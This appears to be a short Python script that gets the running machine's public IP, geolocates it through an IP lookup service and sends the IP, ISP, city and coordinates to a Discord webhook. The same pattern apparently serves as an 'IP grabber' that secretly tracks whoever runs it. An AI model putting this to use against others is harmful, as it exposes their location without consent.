#pip install requests
#pip install dhooks
#pip install datetime

import requests
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("WEBHOOK_URL_HERE")

time = datetime.now().strftime("%I:%M %p")
ip = requests.get("https://api.ipify.org").text

geo = requests.get(f"http://extreme-ip-lookup.com/json/{ip}").json()

embed = Embed(
    title="IP Lookup",
    description=f"Lookup performed at **{time}**",
    color=0x5865F2
)

def add(name, key):
    value = geo.get(key, "N/A")
    embed.add_field(name=name, value=value, inline=True)

add("IP", "query")
add("IP Type", "ipType")
add("Country", "country")
add("City", "city")
add("Region", "region")
add("Continent", "continent")
add("ISP", "isp")
add("Organization", "org")
add("Latitude", "lat")
add("Longitude", "lon")
add("IP Name", "ipName")
add("Status", "status")

hook.send(embed=embed)
